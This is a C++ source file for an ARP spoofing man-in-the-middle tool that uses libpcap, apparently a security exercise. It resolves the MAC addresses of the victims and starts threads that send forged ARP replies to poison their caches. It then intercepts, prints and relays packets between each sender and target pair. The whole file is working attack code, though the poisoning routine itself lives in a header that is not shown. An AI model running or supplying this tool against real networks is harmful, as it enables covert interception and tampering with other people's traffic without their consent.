#include <iostream>
#include <thread>
#include <vector>

#include "arp.h"

using namespace std;

bool is_signal = false;

void sighandler(int signo){
	cout << "Clean for exit..." << endl;
	is_signal = true;
}

int main(int argc, char *argv[])
{
		pcap_t *handle;			/* Session handle */
		char *dev;			/* The device to sniff on */
		char errbuf[PCAP_ERRBUF_SIZE];	/* Error string */
		struct bpf_program fp;		/* The compiled filter */
		char filter_exp[] = "";	/* The filter expression */
		bpf_u_int32 mask;		/* Our netmasmyk */
		bpf_u_int32 net;		/* Our IP */
		struct pcap_pkthdr *header;	/* The header that pcap gives us */
		char *buf = NULL;
		int res;
		int i;

		if(argc < 4 || argc % 2 != 0){
			printf("[Usage] ./pcap [interface] [sender_ip] [target_ip] ([sender_ip2] [target_ip2] ... )\n");
			return 0;
		}

		signal(SIGINT, sighandler);

		handle = pcap_open_live(argv[1], BUFSIZ, 1, 1000, errbuf);
		if (handle == NULL) {
			fprintf(stderr, "Couldn't open device %s: %s\n", dev, errbuf);
			return 2;
		}

		// Initialization Info class & append
		vector<Info *> vinfo;
		for(int i = 2; i < argc; i += 2){
			Info *info = new Info;

			getMyMAC(argv[1], (uint8_t *)info->getMymac());

			inet_pton(AF_INET, argv[i], (uint8_t *)info->getSender_ip());
			inet_pton(AF_INET, argv[i + 1], (uint8_t *)info->getTarget_ip());

			getIPfromMAC(handle, argv[1],
						(uint8_t *)info->getSender_ip(),
						(uint8_t *)info->getSender_mac());
			getIPfromMAC(handle, argv[1],
						(uint8_t *)info->getTarget_ip(),
						(uint8_t *)info->getTarget_mac());

			info->setSpoofing(
				new thread(ARPInfect, handle, argv[1], ARP_REPLY,
						   (uint8_t *)info->getTarget_ip(),
						   (uint8_t *)info->getMymac(),
						   (uint8_t *)info->getSender_ip(),
						   (uint8_t *)info->getSender_mac())
				);

			vinfo.push_back(info);
		}

		ethernet *ether;
		ip *iph;
		tcp *tcph;

		while(is_signal == false){
			res = pcap_next_ex(handle, &header, (const u_char **)&ether);
			if(res <= 0)
				continue;

			if(ether->type == htons(ETHERTYPE_ARP))
				continue;
		
			for(auto iter = vinfo.begin(); iter != vinfo.end(); iter++){
				if(!memcmp((*iter)->getSender_mac(), ether->src, 6) &&
					!memcmp((*iter)->getMymac(), ether->dest, 6))
				{
					printPacket(ether);

					iph = (ip *)((char *)ether + sizeof(ethernet));
					uint32_t len = sizeof(ethernet) + ntohs(iph->total_len);

					memcpy(ether->dest, (*iter)->getTarget_mac(),  6);
					int result = pcap_sendpacket(handle, (uint8_t *)ether, header->len);
					if(result != 0){
						cout << pcap_geterr(handle) << endl;

						result = pcap_sendpacket(handle, (uint8_t *)ether, len);
						if(result != 0){
							cout << pcap_geterr(handle) << endl;
							continue;
						}
					}
				}
				else if(!memcmp((*iter)->getTarget_mac(), ether->src, 6) &&
					!memcmp((*iter)->getMymac(), ether->dest, 6))
				{
					printPacket(ether);
					
					iph = (ip *)((char *)ether + sizeof(ethernet));
					uint32_t len = sizeof(ethernet) + ntohs(iph->total_len);

					memcpy(ether->dest, (*iter)->getSender_mac(), 6);
					int result = pcap_sendpacket(handle, (uint8_t *)ether, header->len);
					if(result != 0){
						cout << pcap_geterr(handle) << endl;

						result = pcap_sendpacket(handle, (uint8_t *)ether, len);
						if(result != 0){
							cout << pcap_geterr(handle) << endl;
							continue;
						}
					}
				}
			}
		}

		pcap_close(handle);
		return(0);
}
